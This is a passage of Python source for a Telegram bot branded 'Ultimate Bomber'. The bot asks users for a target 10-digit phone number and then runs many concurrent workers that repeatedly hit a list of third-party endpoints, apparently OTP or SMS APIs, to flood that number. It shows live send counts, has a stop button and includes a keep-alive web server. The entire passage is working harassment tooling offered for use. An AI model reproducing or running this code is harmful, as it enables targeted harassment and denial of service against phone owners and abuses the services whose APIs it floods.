            ok = await fire_endpoint(ep, target)
        except Exception:
            ok = False
        if ok:
            async with counter["lock"]:
                counter["sent"] += 1
        queue.task_done()


async def _refiller(target: str, queue: asyncio.Queue, session: dict):
    """Keep the queue topped up so workers never starve."""
    while session.get("running"):
        if queue.qsize() < WORKERS:
            for _ in range(REFILL_CHUNK):
                try:
                    queue.put_nowait(random.choice(ENDPOINTS))
                except asyncio.QueueFull:
                    break
        await asyncio.sleep(0.05)


async def run_bombing(uid: int, session: dict):
    target = session["target"]
    queue: asyncio.Queue = asyncio.Queue(maxsize=WORKERS * 4)
    counter = {"sent": 0, "lock": asyncio.Lock()}
    start = time.time()

    # pre-fill
    for _ in range(WORKERS):
        queue.put_nowait(random.choice(ENDPOINTS))

    refill_task = asyncio.create_task(_refiller(target, queue, session))
    workers = [
        asyncio.create_task(_worker(target, queue, session, counter))
        for _ in range(WORKERS)
    ]

    # live progress every 5s
    while session.get("running"):
        await asyncio.sleep(5)
        async with counter["lock"]:
            n = counter["sent"]
        elapsed = int(time.time() - start)
        rate = n / max(elapsed, 1)
        try:
            await Bot(token=BOT_TOKEN).send_message(
                uid,
                f"📊 *Live:* sent {n} | {rate:.1f}/s | {elapsed}s",
                parse_mode="Markdown",
            )
        except Exception:
            pass

    refill_task.cancel()
    for w in workers:
        w.cancel()
    await asyncio.gather(*workers, return_exceptions=True)

    async with counter["lock"]:
        final = counter["sent"]

    try:
        elapsed = int(time.time() - start)
        reason = "🛑 Stopped" if session.get("cancelled") else "✅ Done"
        await Bot(token=BOT_TOKEN).send_message(
            uid,
            f"{reason}!\nTarget: `{target}`\nSent: *{final}*\nTime: {elapsed}s",
            parse_mode="Markdown",
        )
    except Exception:
        pass


# ================== HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_member(ctx.bot, uid):
        await update.message.reply_text(
            "🔒 Join channel first.",
            reply_markup=force_join_keyboard(),
        )
        return
    keyboard = [[InlineKeyboardButton("🚀 START BOMBER", callback_data="start_bomb")]]
    await update.message.reply_text(
        "💥 **ULTIMATE BOMBER** 💥\nClick below to begin.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )


async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id

    if query.data == "verify_join":
        await query.answer("Verified!", show_alert=True)
        keyboard = [[InlineKeyboardButton("🚀 START BOMBER", callback_data="start_bomb")]]
        await query.message.edit_text(
            "✅ Verified!\nClick below.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
        return

    await query.answer()

    if query.data == "start_bomb":
        if not await is_member(ctx.bot, uid):
            await query.message.edit_text(
                "🔒 Join channel first.",
                reply_markup=force_join_keyboard(),
            )
            return
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text("📱 Send target number (10 digits):")

    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("🛑 **STOPPING...**", parse_mode="Markdown")


async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)

    if not s or s.get("state") != "awaiting_target":
        return

    if not is_valid_target(text):
        await update.message.reply_text("❌ Invalid. 10 digits start with 6/7/8/9.")
        return

    s.update(
        target=text, state="running", running=True,
        cancelled=False, sent=0, started_at=time.time(),
    )
    keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
    await update.message.reply_text(
        f"💥 **ACTIVATED** 💥\nTarget: `{text}`\nWorkers: {WORKERS}\nTotal APIs: {len(ENDPOINTS)}\n🔥 **STARTED!**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )
    asyncio.create_task(run_bombing(uid, s))


# ================== WEB SERVER ==================
async def handle_web(scope, receive, send):
    if scope["type"] != "http":
        return
    body = b"Bot is running!"
    await send({
        "type": "http.response.start",
        "status": 200,
        "headers": [(b"content-type", b"text/plain")],
    })
    await send({"type": "http.response.body", "body": body})


async def start_web_server():
    config = uvicorn.Config(handle_web, host="0.0.0.0", port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    await server.serve()


# ================== MAIN ==================
async def main():
    asyncio.create_task(start_web_server())

    logger.info("Starting Ultimate Bomber Bot...")
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    logger.info("✅ Bot is live. Waiting for commands...")

    while True:
        await asyncio.sleep(3600)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
